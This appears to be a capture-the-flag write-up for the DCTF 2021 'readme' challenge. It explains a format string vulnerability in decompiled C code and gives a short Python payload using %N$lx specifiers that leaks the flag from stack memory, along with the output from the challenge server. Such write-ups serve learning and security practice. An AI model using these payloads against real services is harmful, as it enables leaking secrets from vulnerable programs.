

Here is the ``vuln`` function, it reads the flag from *flag.txt*, stores it in an array before the user input array, it takes *0x1e* bytes of input and print it with *printf*. Considered using format string attack, make *printf* print the flag.

```c
void vuln(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char flag [32];
  char input [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(flag,0x1c,__stream);
  fclose(__stream);
  puts("hello, what\'s your name?");
  fgets(input,0x1e,stdin);
  printf("hello ");
  printf(input);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

After severl attemps found the flag located at around "%7$lx" to "%11$lx", so made up the payload as follow.

```python
payload = ''
for i in range(11, 7, -1):
    payload += "%{}$lx".format(i)

pr.sendafter("name?\n", payload)
pr.sendline()
s = pr.readall(2).decode().strip()
s = s[s.find(' ')+1:]
print(s)
print(''.join(reversed(''.join([chr(int(s[i:i+2],16)) for i in range(0, len(s), 2)]))))
```

Sent the payload and the server replied with the flag.

```bash
$ python3 exploit.py
[+] Opening connection to dctf-chall-readme.westeurope.azurecontainer.io on port 7481: Done
%11$lx%10$lx%9$lx%8$lx
[+] Receiving all data: Done (67B)
[*] Closed connection to dctf-chall-readme.westeurope.azurecontainer.io port 7481
7f6f00356b3030625f656d30735f646133725f30675f77306e7b66746364
dctf{n0w_g0_r3ad_s0me_b00k5\x00\x7f
```

Full exploit goes [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/readme/exploit.py).
